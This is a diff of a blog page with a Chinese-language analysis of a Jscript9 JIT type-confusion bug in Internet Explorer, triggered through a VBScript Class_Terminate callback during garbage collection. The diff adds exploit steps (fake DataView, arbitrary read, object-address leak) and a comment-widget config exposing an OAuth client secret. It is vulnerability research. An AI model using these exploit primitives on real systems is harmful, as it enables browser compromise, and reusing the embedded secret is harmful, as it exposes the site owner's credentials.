@@ -24,15 +24,15 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"theme-me.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.3.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
-<meta name="description" content="0x0 概述漏洞样本来自yuki chen的github 漏洞成因：由于JavaScript中的垃圾回收流程内，可以通过VBScript Class_Terminator触发回调，而JIT引擎未考虑到这一点。因此在JIT代码中可以通过这种方式触发回调。 并且由于Jscript9对下方代码时进行JIT优化时，会触发冗余消除机制:  ... arr[1,2,3] b &#x3D; arr[0] ... c &#x3D;">
+<meta name="description" content="0x0 概述漏洞样本来自yuki chen的github 漏洞成因：JavaScript中的垃圾回收流程内，可以通过VBScript Class_Terminator触发回调，而JIT引擎未考虑到这一点。因此在JIT代码中可以通过这种方式触发回调。 并且在Jscript9对下方代码时进行JIT优化时，会触发冗余消除机制:  ... arr[1,2,3] b &#x3D; arr[0] ... c &#x3D; arr">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Jscript9 GC JIT Calc">
 <meta property="og:url" content="https://theme-me.github.io/Jscript9%20GC%20JIT%20Calc/index.html">
 <meta property="og:site_name" content="theme">
-<meta property="og:description" content="0x0 概述漏洞样本来自yuki chen的github 漏洞成因：由于JavaScript中的垃圾回收流程内，可以通过VBScript Class_Terminator触发回调，而JIT引擎未考虑到这一点。因此在JIT代码中可以通过这种方式触发回调。 并且由于Jscript9对下方代码时进行JIT优化时，会触发冗余消除机制:  ... arr[1,2,3] b &#x3D; arr[0] ... c &#x3D;">
+<meta property="og:description" content="0x0 概述漏洞样本来自yuki chen的github 漏洞成因：JavaScript中的垃圾回收流程内，可以通过VBScript Class_Terminator触发回调，而JIT引擎未考虑到这一点。因此在JIT代码中可以通过这种方式触发回调。 并且在Jscript9对下方代码时进行JIT优化时，会触发冗余消除机制:  ... arr[1,2,3] b &#x3D; arr[0] ... c &#x3D; arr">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-04-18T09:03:26.000Z">
-<meta property="article:modified_time" content="2021-04-18T01:21:11.334Z">
+<meta property="article:published_time" content="2020-04-18T09:00:00.000Z">
+<meta property="article:modified_time" content="2021-04-20T02:50:36.033Z">
 <meta property="article:author" content="theme">
 <meta property="article:tag" content="nothing">
 <meta name="twitter:card" content="summary">
@@ -138,7 +138,7 @@
 <nav class="site-nav">
   <ul class="main-menu menu">
         <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-bell fa-fw"></i>Home</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">1</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">2</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
         </a>
@@ -195,7 +195,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0-%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">0x0 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">0x1 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-force-to-optimize"><span class="nav-number">2.1.</span> <span class="nav-text">1.force to optimize</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC"><span class="nav-number">2.2.</span> <span class="nav-text">2.using VBScript Class_Terminator to trigger Callback in JavaScript GC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Type-Confusion"><span class="nav-number">2.3.</span> <span class="nav-text">3.Type Confusion</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#func%E5%87%BD%E6%95%B0JIT%E5%90%8E%E7%9A%84%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="nav-number">2.3.1.</span> <span class="nav-text">func函数JIT后的关键代码：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">0x2 利用分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">0x3 总结</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x0-%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">0x0 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">0x1 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#force-to-optimize"><span class="nav-number">2.1.</span> <span class="nav-text">force to optimize</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC"><span class="nav-number">2.2.</span> <span class="nav-text">using VBScript Class_Terminator to trigger Callback in JavaScript GC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Type-Confusion"><span class="nav-number">2.3.</span> <span class="nav-text">Type Confusion</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#func%E5%87%BD%E6%95%B0JIT%E5%90%8E%E7%9A%84%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="nav-number">2.3.1.</span> <span class="nav-text">func函数JIT后的关键代码：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">0x2 利用分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">0x3 总结</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -211,7 +211,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -288,23 +288,9 @@
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2020-04-18 09:03:26" itemprop="dateCreated datePublished" datetime="2020-04-18T09:03:26Z">2020-04-18</time>
+      <time title="Created: 2020-04-18 09:00:00" itemprop="dateCreated datePublished" datetime="2020-04-18T09:00:00Z">2020-04-18</time>
     </span>
 
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/Jscript9%20GC%20JIT%20Calc/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="Jscript9 GC JIT Calc/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
   
 </div>
 
@@ -316,8 +302,8 @@
     
     <div class="post-body" itemprop="articleBody">
         <h2 id="0x0-概述"><a href="#0x0-概述" class="headerlink" title="0x0 概述"></a>0x0 概述</h2><p>漏洞样本来自<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2d1aGUxMjAvYnJvd3Nlci9ibG9iL21hc3Rlci9HQy9qaXRfY2FsYy5odG1s">yuki chen的github<i class="fa fa-external-link-alt"></i></span></p>
-<p>漏洞成因：由于JavaScript中的垃圾回收流程内，可以通过VBScript Class_Terminator触发回调，而JIT引擎未考虑到这一点。因此在JIT代码中可以通过这种方式触发回调。</p>
-<p>并且由于Jscript9对下方代码时进行JIT优化时，会触发冗余消除机制: </p>
+<p>漏洞成因：JavaScript中的垃圾回收流程内，可以通过VBScript Class_Terminator触发回调，而JIT引擎未考虑到这一点。因此在JIT代码中可以通过这种方式触发回调。</p>
+<p>并且在Jscript9对下方代码时进行JIT优化时，会触发冗余消除机制: </p>
 <pre><code>...
 arr[1,2,3]
 b = arr[0]
@@ -325,11 +311,11 @@ b = arr[0]
 c = arr[1]
 ...
 </code></pre>
-<p>优化后的代码访问arr[0]和arr[1]两个成员时，由于冗余消除机制，只会检查arr对象的类型一次，借此就能通过在jit代码中触发垃圾回收进而触发回调，在回调中修改arr对象成员的类型实现类型混淆，进而获得完整exploit。</p>
+<p>优化后的代码访问arr[0]和arr[1]两个成员时，由于冗余消除机制，只会检查arr对象的类型一次，借此就能通过在JIT代码中触发垃圾回收进而触发回调，在回调中修改arr对象成员的类型实现类型混淆，进而获得完整exploit。</p>
 <blockquote>
 <p>saelo在<span class="exturl" data-url="aHR0cDovL3BocmFjay5vcmcvcGFwZXJzL2ppdF9leHBsb2l0YXRpb24uaHRtbA==">The Art of Exploitation<i class="fa fa-external-link-alt"></i></span>中提到了该机制。</p>
 </blockquote>
-<h2 id="0x1-漏洞分析"><a href="#0x1-漏洞分析" class="headerlink" title="0x1 漏洞分析"></a>0x1 漏洞分析</h2><h3 id="1-force-to-optimize"><a href="#1-force-to-optimize" class="headerlink" title="1.force to optimize"></a><strong>1.force to optimize</strong></h3><p>下方代码的功能为强制触发JIT优化:</p>
+<h2 id="0x1-漏洞分析"><a href="#0x1-漏洞分析" class="headerlink" title="0x1 漏洞分析"></a>0x1 漏洞分析</h2><h3 id="force-to-optimize"><a href="#force-to-optimize" class="headerlink" title="force to optimize"></a><strong>force to optimize</strong></h3><p>下方代码的功能为强制触发JIT优化:</p>
 <pre><code>var a = [1, 2, 3];
 stop = true;
 
@@ -337,7 +323,7 @@ for (var i = 0; i &lt; 10000; ++i)
     func(a, [&#123;&#125;, &#123;&#125;]);
 </code></pre>
 <p>循环过程中触发JIT优化，优化完成后解释执行函数入口被修改为JIT函数入口，为后续利用做准备。</p>
-<h3 id="2-using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC"><a href="#2-using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC" class="headerlink" title="2.using VBScript Class_Terminator to trigger Callback in JavaScript GC"></a><strong>2.using VBScript Class_Terminator to trigger Callback in JavaScript GC</strong></h3><p>下方代码在vbscript中创建了类cla0，并且在其Class_Terminate回调中调用了JavaScript中的函数：</p>
+<h3 id="using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC"><a href="#using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC" class="headerlink" title="using VBScript Class_Terminator to trigger Callback in JavaScript GC"></a><strong>using VBScript Class_Terminator to trigger Callback in JavaScript GC</strong></h3><p>下方代码在vbscript中创建了类cla0，并且在其Class_Terminate回调中调用了JavaScript中的函数：</p>
 <pre><code>&lt;script type=&quot;text/vbscript&quot;&gt;
 
 Dim o
@@ -361,7 +347,7 @@ arr[0] = null;
 
 setTimeout(main, 1);
 </code></pre>
-<h3 id="3-Type-Confusion"><a href="#3-Type-Confusion" class="headerlink" title="3.Type Confusion"></a><strong>3.Type Confusion</strong></h3><p>下面是main函数中调用func函数部分代码，与func函数实现:</p>
+<h3 id="Type-Confusion"><a href="#Type-Confusion" class="headerlink" title="Type Confusion"></a><strong>Type Confusion</strong></h3><p>下面是main函数中调用func函数部分代码，与func函数实现:</p>
 <pre><code>var u32 = new Uint32Array(10);
 var ga = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 var fo = new Array(&#123;&#125;, &#123;&#125;, &#123;&#125;);
@@ -437,7 +423,7 @@ function main() &#123;
 1c0d9266    mov     ecx, 0
 1c0d926b    cmp     dword ptr [ebx], offset jscript9!Js::JavascriptArray::`vftable&#39; (713638c0)
 </code></pre>
-<p>a2[1] = ga: 此处直接将ga对象地址放入了<strong>JavascriptArray</strong>的buffer中，fo对象地址也以同样的方式被放入a2[2]。</p>
+<p>a2[1] = ga: 此处直接将ga对象地址放入了<strong>JavascriptArray</strong>的buffer中，fo对象地址也以同样的方式被放入a2[2]。ga用于伪造DataView，fo用于泄露对象地址。</p>
 <pre><code>...
 1c0d9249    mov     eax, dword ptr ds:[11E36208h]   ;eax: ga address
 1c0d924f    mov     eax, dword ptr [eax+5B4h]
@@ -491,7 +477,7 @@ ga[5] = 0;
 ga[6] = -1;
 ga[7] = dv_addr;
 </code></pre>
-<p>这里通过封装DataView.prototype.getUint32.call实现了读取任意地址。当前伪造的DataView是没有虚表的，这里通过调用prototype的虚函数（即Js::DataView::EntryGetUint32，上方伪造的DataView成员值是为了绕过该函数中的检查）来绕过对伪造的DataView虚表的访问</p>
+<p>这里通过封装DataView.prototype.getUint32.call实现了读取任意地址。当前伪造的DataView是没有虚表的，这里通过调用prototype的虚函数（即Js::DataView::EntryGetUint32，上方伪造的DataView成员值是为了绕过该函数中的检查）来绕过对伪造的DataView虚表的访问。</p>
 <pre><code>function read32(addr) &#123;
     if (addr &gt;= 0x80000000) &#123;
         addr = -(0x100000000 - addr);
@@ -501,11 +487,17 @@ ga[7] = dv_addr;
 
 &#125;
 </code></pre>
-<p>从正确的DataView对象中取出Type字段，填充进伪造的DataView对象内。</p>
+<p>通过类型混淆获得的fo对象地址(类型为<strong>JavascriptArray</strong>，array buffer位于+38h处)和上方实现的任意读实现泄露对象地址，借此从正确的DataView对象中取出Type字段，填充进伪造的DataView对象内。</p>
 <blockquote>
-<p>不修改该字段获取target_arr地址过程中会报错</p>
+<p>不修改该字段获取target_arr地址过程中会报错。</p>
 </blockquote>
-<pre><code>dv = a[0];
+<pre><code>function leakObjectAddress(o)
+&#123;
+    fo[0] = o;
+    return readPointer(fo_addr + 0x38);
+&#125;
+
+dv = a[0];
 var rdv = new DataView(new ArrayBuffer(8));
 var rtype = readPointer(leakObjectAddress(rdv) + 4);
 
@@ -546,6 +538,15 @@ if (cmd_addr in target_arr) &#123; &#125;
 
         
 
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/cve-2018-4990/" rel="next" title="CVE-2018-4990 analysis">
+                  CVE-2018-4990 analysis <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
     </footer>
   </article>
 </div>
@@ -555,11 +556,7 @@ if (cmd_addr in target_arr) &#123; &#125;
 
 
 
-    
-  <div class="comments" id="disqus_thread">
-    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
-  </div>
-  
+    <div class="comments gitalk-container"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -683,35 +680,25 @@ if (mermaidElements.length) {
   
 
 
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
 <script>
-  function loadCount() {
-    var d = document, s = d.createElement('script');
-    s.src = 'https://next-theme.disqus.com/count.js';
-    s.id = 'dsq-count-scr';
-    (d.head || d.body).appendChild(s);
-  }
-  // defer loading until the whole page loading is completed
-  window.addEventListener('load', loadCount, false);
-</script>
-<script>
-  var disqus_config = function() {
-    this.page.url = "https://theme-me.github.io/Jscript9%20GC%20JIT%20Calc/";
-    this.page.identifier = "Jscript9 GC JIT Calc/";
-    this.page.title = "Jscript9 GC JIT Calc";
-    };
-  NexT.utils.loadComments('#disqus_thread', () => {
-    if (window.DISQUS) {
-      DISQUS.reset({
-        reload: true,
-        config: disqus_config
-      });
-    } else {
-      var d = document, s = d.createElement('script');
-      s.src = 'https://next-theme.disqus.com/embed.js';
-      s.setAttribute('data-timestamp', '' + +new Date());
-      (d.head || d.body).appendChild(s);
-    }
-  });
+NexT.utils.loadComments('.gitalk-container', () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'baadf2c2ad28974ca4f2',
+      clientSecret: 'b8b7996896ca1cee6ff71eabc502cb96a2e73af2',
+      repo        : 'comments',
+      owner       : 'theme-me',
+      admin       : ['theme'],
+      id          : '234863348014a4e34ba835c820640728',
+      proxy       : 'https://cors-anywhere.herokuapp.com/https://github.com/login/oauth/access_token',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render(document.querySelector('.gitalk-container'));
+  }, window.Gitalk);
+});
 </script>
 
     </div>
